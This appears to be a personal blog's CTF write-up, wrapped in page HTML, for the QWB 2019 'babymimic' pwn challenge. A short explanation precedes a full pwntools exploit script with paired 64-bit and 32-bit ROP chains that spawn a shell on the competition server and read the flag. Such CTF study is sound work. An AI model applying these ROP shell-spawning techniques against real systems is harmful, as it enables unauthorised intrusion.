@@ -1,0 +1,788 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.5.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.5.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.5.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.5.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.5.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.5.0',
+    sidebar: {"position":"right","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '7MJODQTH3W',
+      apiKey: 'd8c6f430a78a240fd1e1b165418d1c45',
+      indexName: 'Github',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="介绍qwb2019，PWN中最简单的一道题？（除了送分题）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="qwb2019-babymimic">
+<meta property="og:url" content="https://mf-x.github.io/2019/05/27/qwb2019-babymimic/index.html">
+<meta property="og:site_name" content="ivan">
+<meta property="og:description" content="介绍qwb2019，PWN中最简单的一道题？（除了送分题）">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2019-05-27T11:33:03.263Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="qwb2019-babymimic">
+<meta name="twitter:description" content="介绍qwb2019，PWN中最简单的一道题？（除了送分题）">
+
+
+
+
+
+
+  <link rel="canonical" href="https://mf-x.github.io/2019/05/27/qwb2019-babymimic/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>qwb2019-babymimic | ivan</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ivan</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">Blog</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Search</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  
+  <div class="algolia-popup popup search-popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+  </div>
+
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://mf-x.github.io/2019/05/27/qwb2019-babymimic/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ivan Mo">
+      <meta itemprop="description" content="Practise makes perfect!">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ivan">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">qwb2019-babymimic
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-05-27 19:20:47 / Modified: 19:33:03" itemprop="dateCreated datePublished" datetime="2019-05-27T19:20:47+08:00">2019-05-27</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>qwb2019，PWN中最简单的一道题？（除了送分题）</p>
+<a id="more"></a>
+<h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>给了两个binary，一个64位一个32位。基本一样都是一个简单的栈溢出，ROP即可。但是两个成功都拿不到flag。</p>
+<p>队友提示mimic，可能和拟态有关，后面证实要写一个64位和32位通用的payload。</p>
+<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>栈溢出，其中64位的比32位的要多溢出8位，所以可以通知32位的程序跳过64位的ropchain，直接跳到32的ropchain就好了。</p>
+<p>用的ROPgadget是：<code># 0x0807c2b9 : add esp, 0x90 ; pop ebx ; pop esi ; pop edi ; ret</code></p>
+<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"49.4.51.149"</span>, <span class="number">25391</span>)</span><br><span class="line">alphabet = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">255</span>):</span><br><span class="line">    alphabet += chr(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_chal</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">")="</span>)</span><br><span class="line">    chal = p.readline()[:<span class="number">-1</span>]</span><br><span class="line">    p.recvuntil(<span class="string">"hex')="</span>)</span><br><span class="line">    skr = p.readline()[:<span class="number">-1</span>]</span><br><span class="line">    skr = unhex(skr)</span><br><span class="line">    print(chal, skr)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fun1</span><span class="params">(s)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> sha256(skr+s).hexdigest() == chal</span><br><span class="line">    ans = mbruteforce(fun1, alphabet, <span class="number">3</span>)</span><br><span class="line">    <span class="comment"># raw_input('chanl?')</span></span><br><span class="line">    p.sendline(enhex(skr+ans))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">do_chal()</span><br><span class="line">token = <span class="string">'2535753c4e39491b79d8c0273f164c4b'</span></span><br><span class="line">p.sendlineafter(<span class="string">'[+]teamtoken:'</span>, token)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">ropchain = <span class="string">''</span></span><br><span class="line">ropchain += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000405895</span>)  <span class="comment"># pop rsi ; ret</span></span><br><span class="line">ropchain += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006a10e0</span>)  <span class="comment"># @ .data</span></span><br><span class="line">ropchain += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000043b97c</span>)  <span class="comment"># pop rax ; ret</span></span><br><span class="line">ropchain += <span class="string">'/bin//sh'</span></span><br><span class="line">ropchain += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046aea1</span>)  <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">ropchain += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000405895</span>)  <span class="comment"># pop rsi ; ret</span></span><br><span class="line">ropchain += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006a10e8</span>)  <span class="comment"># @ .data + 8</span></span><br><span class="line">ropchain += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000436ed0</span>)  <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">ropchain += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046aea1</span>)  <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">ropchain += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000004005f6</span>)  <span class="comment"># pop rdi ; ret</span></span><br><span class="line">ropchain += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000000003b</span>)  <span class="comment"># 59 = 0x3b</span></span><br><span class="line">ropchain += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000040a4f3</span>)  <span class="comment"># mov rax, rdi ; ret</span></span><br><span class="line">ropchain += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000004005f6</span>)  <span class="comment"># pop rdi ; ret</span></span><br><span class="line">ropchain += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006a10e0</span>)  <span class="comment"># @ .data</span></span><br><span class="line">ropchain += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000405895</span>)  <span class="comment"># pop rsi ; ret</span></span><br><span class="line">ropchain += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006a10e8</span>)  <span class="comment"># @ .data + 8</span></span><br><span class="line">ropchain += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000043b9d5</span>)  <span class="comment"># pop rdx ; ret</span></span><br><span class="line">ropchain += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006a10e8</span>)  <span class="comment"># @ .data + 8</span></span><br><span class="line">ropchain += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000461645</span>)  <span class="comment"># syscall ; ret</span></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">ropchain32 = <span class="string">''</span></span><br><span class="line">ropchain32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806e9cb</span>)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">ropchain32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080d9060</span>)  <span class="comment"># @ .data</span></span><br><span class="line">ropchain32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080a8af6</span>)  <span class="comment"># pop eax ; ret</span></span><br><span class="line">ropchain32 += <span class="string">'/bin'</span></span><br><span class="line">ropchain32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056a85</span>)  <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">ropchain32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806e9cb</span>)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">ropchain32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080d9064</span>)  <span class="comment"># @ .data + 4</span></span><br><span class="line">ropchain32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080a8af6</span>)  <span class="comment"># pop eax ; ret</span></span><br><span class="line">ropchain32 += <span class="string">'//sh'</span></span><br><span class="line">ropchain32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056a85</span>)  <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">ropchain32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806e9cb</span>)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">ropchain32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080d9068</span>)  <span class="comment"># @ .data + 8</span></span><br><span class="line">ropchain32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056040</span>)  <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">ropchain32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056a85</span>)  <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">ropchain32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080481c9</span>)  <span class="comment"># pop ebx ; ret</span></span><br><span class="line">ropchain32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080d9060</span>)  <span class="comment"># @ .data</span></span><br><span class="line">ropchain32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806e9f2</span>)  <span class="comment"># pop ecx ; pop ebx ; ret</span></span><br><span class="line">ropchain32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080d9068</span>)  <span class="comment"># @ .data + 8</span></span><br><span class="line">ropchain32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080d9060</span>)  <span class="comment"># padding without overwrite ebx</span></span><br><span class="line">ropchain32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806e9cb</span>)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">ropchain32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080d9068</span>)  <span class="comment"># @ .data + 8</span></span><br><span class="line">ropchain32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056040</span>)  <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">ropchain32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080a8af6</span>)  <span class="comment"># pop eax ; ret</span></span><br><span class="line">ropchain32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0000000b</span>)  <span class="comment"># 11</span></span><br><span class="line">ropchain32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080495a3</span>)  <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x0807c2b9 : add esp, 0x90 ; pop ebx ; pop esi ; pop edi ; ret</span></span><br><span class="line">add_esp = <span class="number">0x0807c2b9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"\x00"</span> * <span class="number">272</span> + p32(add_esp) + <span class="string">"\x00"</span> * <span class="number">4</span> + ropchain + ropchain32</span><br><span class="line">p.recvuntil(<span class="string">"try to pwn it?\n"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'cat flag_02a7b07af3f3df6e000ce777c2e530e0'</span>)</span><br><span class="line">flag = p.recv(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stream_decode</span><span class="params">(flag, token)</span>:</span></span><br><span class="line">    s = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(flag)):</span><br><span class="line">        <span class="keyword">print</span> i</span><br><span class="line">        s += chr(ord(flag[i]) ^ ord(token[i % len(token)]))</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'flag&#123;'</span> + stream_encode(flag.decode(<span class="string">'hex'</span>), token) + <span class="string">'&#125;'</span></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/05/20/rctf2019-DontEatMe/" rel="next" title="rctf2019-DontEatMe">
+                <i class="fa fa-chevron-left"></i> rctf2019-DontEatMe
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/05/27/qwb2019-babycpp/" rel="prev" title="qwb2019-babycpp">
+                qwb2019-babycpp <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">ivan Mo</p>
+              <p class="site-description motion-element" itemprop="description">Practise makes perfect!</p>
+          </div>
+
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/mf-x" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:myf.ilucky@gmail.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="/wechat/" target="_blank" title="WeChat"><i class="fa fa-fw fa-weixin"></i>WeChat</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://www.jnu.edu.cn" target="_blank" title="School"><i class="fa fa-fw fa-graduation-cap"></i>School</a>
+                  
+                </span>
+              
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#介绍"><span class="nav-number">1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#分析程序"><span class="nav-number">2.</span> <span class="nav-text">分析程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用方式"><span class="nav-number">3.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#脚本"><span class="nav-number">4.</span> <span class="nav-text">脚本</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright"> &copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ivan Mo</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Pisces</a> v6.5.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.5.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.5.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.5.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.5.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.5.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.5.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.5.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/algolia-instant-search/instantsearch.min.css">
+
+  
+  
+  <script src="/lib/algolia-instant-search/instantsearch.min.js"></script>
+  
+
+  <script src="/js/src/algolia-search.js?v=6.5.0"></script>
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
